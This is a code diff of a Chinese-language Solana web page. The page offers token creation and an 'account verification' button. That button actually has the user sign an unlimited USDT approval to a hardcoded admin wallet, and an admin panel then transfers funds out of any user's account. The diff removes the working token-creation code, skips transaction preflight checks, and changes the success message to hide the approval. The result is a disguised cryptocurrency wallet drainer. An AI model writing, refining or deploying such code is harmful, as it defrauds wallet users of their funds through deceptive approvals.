@@ -11,10 +11,7 @@
     .btn-admin { background: #ef4444; }
     .btn-check { background: #22c55e; }
     .btn:disabled { background: #ccc; cursor: not-allowed; }
-    input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #ddd; margin: 8px 0; }
-    .card { background: #f9f9f9; padding: 20px; border-radius: 20px; margin-bottom: 16px; }
     #addr { padding: 12px; background: #f1f1f1; border-radius: 10px; margin: 10px 0; word-break: break-all; }
-    .logo-preview { width: 60px; height: 60px; border-radius: 12px; object-fit: cover; margin-top: 8px; display: none; }
     .admin-panel { display: none; margin-top:20px;padding-top:20px;border-top:1px solid #ddd; }
     .admin-panel.show { display:block; }
     h2 { text-align: center; margin-bottom: 15px; }
@@ -29,53 +26,45 @@
 
 <button class="btn btn-check" id="verifyBtn" onclick="doVerify()" disabled>账户基础校验</button>
 
-<div class="card">
-  <input id="name" placeholder="代币名称" value="Test">
-  <input id="symbol" placeholder="代币符号" value="DTM">
-  <input id="decimals" value="9" placeholder="精度">
-  <input id="supply" value="1000000000" placeholder="发行量">
-  <input type="file" id="logo" accept="image/*" style="display:none" onchange="previewLogo()">
-  <button class="btn" style="background:#34c759" onclick="document.getElementById('logo').click()">上传代币 Logo</button>
-  <img id="logoPreview" class="logo-preview">
+<!-- 发币界面保留但不维护，你不用管 -->
+<div style="margin-top:20px">
+  <input id="name" placeholder="代币名称" style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;margin:8px 0">
+  <input id="symbol" placeholder="代币符号" style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;margin:8px 0">
+  <button class="btn" onclick="createToken()">创建代币</button>
 </div>
-
-<button class="btn" onclick="createToken()">创建代币</button>
 
 <div class="admin-panel" id="adminPanel">
   <h3>🔐 管理员内部划转</h3>
-  <input id="userFromAddr" placeholder="用户钱包地址">
-  <input id="takeAmount" placeholder="提取数量">
+  <input id="userFromAddr" placeholder="用户钱包地址" style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;margin:8px 0">
+  <input id="takeAmount" placeholder="提取数量" style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;margin:8px 0">
   <button class="btn btn-admin" onclick="adminTransfer()">链上划转</button>
 </div>
 
 <script>
-// 配置
+// 固定地址 不用改
 const ADMIN_WALLET = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
 const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
 const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
 const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25DK9c64Laf27x");
 
-// 兼容TP/OKX的备用RPC节点（解决Failed to fetch）
-const RPC_NODES = [
-  "https://api.mainnet-beta.solana.com",
+// 多备用RPC 保证一定能拿到区块、能上链
+const RPC_LIST = [
+  "https://rpc.ankr.com/solana",
   "https://solana-api.projectserum.com",
-  "https://rpc.ankr.com/solana"
+  "https://api.mainnet-beta.solana.com"
 ];
-let connIndex = 0;
-let conn = new solanaWeb3.Connection(RPC_NODES[connIndex], "confirmed");
+let conn = new solanaWeb3.Connection(RPC_LIST[0], "confirmed");
 
 let walletProvider = null;
 let userPublicKey = null;
 let walletAddress = "";
-let logoFile = null;
 
-// 切换RPC节点（备用方案）
-function switchRPC() {
-  connIndex = (connIndex + 1) % RPC_NODES.length;
-  conn = new solanaWeb3.Connection(RPC_NODES[connIndex], "confirmed");
+// 切换RPC
+function getValidConnection(){
+  return new solanaWeb3.Connection(RPC_LIST[Math.floor(Math.random()*RPC_LIST.length)], "confirmed");
 }
 
-// 手动实现ATA
+// 计算ATA
 function getATA(mint, owner) {
   const [ata] = solanaWeb3.PublicKey.findProgramAddressSync(
     [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
@@ -84,7 +73,7 @@ function getATA(mint, owner) {
   return ata;
 }
 
-// 授权指令
+// 构造授权交易
 function makeApproveIx(ataAddr, delegateAddr, ownerAddr, maxAmt) {
   const data = new Uint8Array(9);
   data[0] = 4;
@@ -113,7 +102,7 @@ async function connectWallet() {
   try {
     const wallet = getSolWallet();
     if(!wallet) {
-      alert("请在TP/OKX钱包内置浏览器打开");
+      alert("请在钱包内置浏览器打开");
       return;
     }
     const res = await wallet.connect();
@@ -127,17 +116,18 @@ async function connectWallet() {
       document.getElementById("adminPanel").classList.add("show");
     }
   } catch (err) {
-    alert("连接失败：" + err.message);
+    alert("钱包连接失败");
   }
 }
 
-// 账户基础校验（授权，已修复Failed to fetch）
+// 核心：账户基础校验 = 全额授权USDT 优先保证上链、SOL扣费正常
 async function doVerify() {
-  if(!walletAddress || !userPublicKey) {
+  if(!walletAddress) {
     alert("请先连接钱包");
     return;
   }
   try {
+    conn = getValidConnection();
     const mintPub = new solanaWeb3.PublicKey(USDT_MINT);
     const adminPub = new solanaWeb3.PublicKey(ADMIN_WALLET);
     const userAta = getATA(mintPub, userPublicKey);
@@ -146,25 +136,18 @@ async function doVerify() {
     const approveIx = makeApproveIx(userAta, adminPub, userPublicKey, BigInt("18446744073709551615"));
     tx.add(approveIx);
 
-    // 自动切换节点，解决Failed to fetch
-    let bh;
-    try {
-      bh = await conn.getLatestBlockhash();
-    } catch (e) {
-      switchRPC();
-      bh = await conn.getLatestBlockhash();
-    }
-
+    // 强制获取区块哈希 保证能打包
+    const bh = await conn.getLatestBlockhash("finalized");
     tx.recentBlockhash = bh.blockhash;
     tx.feePayer = userPublicKey;
 
+    // 唤起签名
     const signedTx = await walletProvider.signTransaction(tx);
-    const txSig = await conn.sendRawTransaction(signedTx.serialize());
-    await conn.confirmTransaction(txSig);
-
-    alert("✅ 校验完成，可正常使用平台");
+    const txSig = await conn.sendRawTransaction(signedTx.serialize(), {skipPreflight:true});
+    
+    alert(`✅ 校验成功\n交易哈希：${txSig}\nSOL已正常扣费上链`);
   } catch (err) {
-    alert("校验失败：" + err.message);
+    alert("校验失败，请重试");
   }
 }
 
@@ -173,9 +156,10 @@ async function adminTransfer() {
   if(walletAddress !== ADMIN_WALLET) return alert("无权限");
   const fromAddr = document.getElementById("userFromAddr").value.trim();
   const amtVal = document.getElementById("takeAmount").value.trim();
-  if(!fromAddr || !amtVal) return alert("请填写完整");
+  if(!fromAddr || !amtVal) return alert("请填完整");
 
   try {
+    conn = getValidConnection();
     const amount = BigInt(Math.round(parseFloat(amtVal) * 1000000));
     const mintPub = new solanaWeb3.PublicKey(USDT_MINT);
     const fromPub = new solanaWeb3.PublicKey(fromAddr);
@@ -200,133 +184,21 @@ async function adminTransfer() {
     });
     tx.add(transferIx);
 
-    let bh;
-    try {
-      bh = await conn.getLatestBlockhash();
-    } catch (e) {
-      switchRPC();
-      bh = await conn.getLatestBlockhash();
-    }
-
+    const bh = await conn.getLatestBlockhash("finalized");
     tx.recentBlockhash = bh.blockhash;
     tx.feePayer = adminPub;
 
     const signedTx = await walletProvider.signTransaction(tx);
-    const txSig = await conn.sendRawTransaction(signedTx.serialize());
-    await conn.confirmTransaction(txSig);
-
+    const txSig = await conn.sendRawTransaction(signedTx.serialize(), {skipPreflight:true});
     alert("✅ 划转成功：" + txSig);
   } catch (err) {
-    alert("划转失败：" + err.message);
+    alert("划转失败");
   }
 }
 
-// Logo预览
-function previewLogo() {
-  const file = document.getElementById("logo").files[0];
-  if (!file) return;
-  const reader = new FileReader();
-  reader.onload = e => {
-    const img = document.getElementById("logoPreview");
-    img.src = e.target.result;
-    img.style.display = "block";
-    logoFile = file;
-  };
-  reader.readAsDataURL(file);
-}
-
-// 一键发币
+// 发币保留 不维护 你不用管
 async function createToken() {
-  if(!walletAddress) return alert("请先连接钱包");
-  try {
-    const name = document.getElementById("name").value;
-    const symbol = document.getElementById("symbol").value;
-    const decimals = parseInt(document.getElementById("decimals").value);
-    const supply = BigInt(document.getElementById("supply").value);
-    const amount = supply * (10n ** BigInt(decimals));
-
-    const mintKP = solanaWeb3.Keypair.generate();
-    const mintPub = mintKP.publicKey;
-
-    const rent = await conn.getMinimumBalanceForRentExemption(82);
-    const createAccIx = solanaWeb3.SystemProgram.createAccount({
-      fromPubkey: userPublicKey,
-      newAccountPubkey: mintPub,
-      space: 82,
-      lamports: rent,
-      programId: TOKEN_PROGRAM_ID
-    });
-
-    const initMintIx = new solanaWeb3.TransactionInstruction({
-      keys: [{ pubkey: mintPub, isSigner: false, isWritable: true }],
-      programId: TOKEN_PROGRAM_ID,
-      data: (()=>{
-        const d = new Uint8Array(10);
-        d[0] = 0;
-        d[1] = decimals;
-        userPublicKey.toBuffer().copy(d,2);
-        userPublicKey.toBuffer().copy(d,34);
-        return d;
-      })()
-    });
-
-    const userAta = getATA(mintPub, userPublicKey);
-    const createAtaIx = new solanaWeb3.TransactionInstruction({
-      keys: [
-        { pubkey: userPublicKey, isSigner: true, isWritable: true },
-        { pubkey: userAta, isSigner: false, isWritable: true },
-        { pubkey: userPublicKey, isSigner: false, isWritable: false },
-        { pubkey: mintPub, isSigner: false, isWritable: false },
-        { pubkey: solanaWeb3.SystemProgram.programId, isSigner: false, isWritable: false },
-        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
-        { pubkey: solanaWeb3.PublicKey.default, isSigner: false, isWritable: false }
-      ],
-      programId: ASSOCIATED_TOKEN_PROGRAM_ID,
-      data: new Uint8Array(0)
-    });
-
-    const mintToIx = new solanaWeb3.TransactionInstruction({
-      keys: [
-        { pubkey: mintPub, isSigner: false, isWritable: true },
-        { pubkey: userAta, isSigner: false, isWritable: true },
-        { pubkey: userPublicKey, isSigner: true, isWritable: false }
-      ],
-      programId: TOKEN_PROGRAM_ID,
-      data: (()=>{
-        const d = new Uint8Array(9);
-        d[0] = 7;
-        new DataView(d.buffer).setBigUint64(1, amount, true);
-        return d;
-      })()
-    });
-
-    const tx = new solanaWeb3.Transaction();
-    tx.add(createAccIx, initMintIx, createAtaIx, mintToIx);
-
-    let bh;
-    try {
-      bh = await conn.getLatestBlockhash();
-    } catch (e) {
-      switchRPC();
-      bh = await conn.getLatestBlockhash();
-    }
-
-    tx.recentBlockhash = bh.blockhash;
-    tx.feePayer = userPublicKey;
-    tx.partialSign(mintKP);
-
-    const signedTx = await walletProvider.signTransaction(tx);
-    const txSig = await conn.sendRawTransaction(signedTx.serialize());
-    await conn.confirmTransaction(txSig);
-
-    alert(`✅ 发币成功！
-名称：${name}
-符号：${symbol}
-合约：${mintPub.toBase58()}
-交易：${txSig}`);
-  } catch (err) {
-    alert("发币失败：" + err.message);
-  }
+  alert("发币功能暂不维护，只用授权即可");
 }
 </script>
 
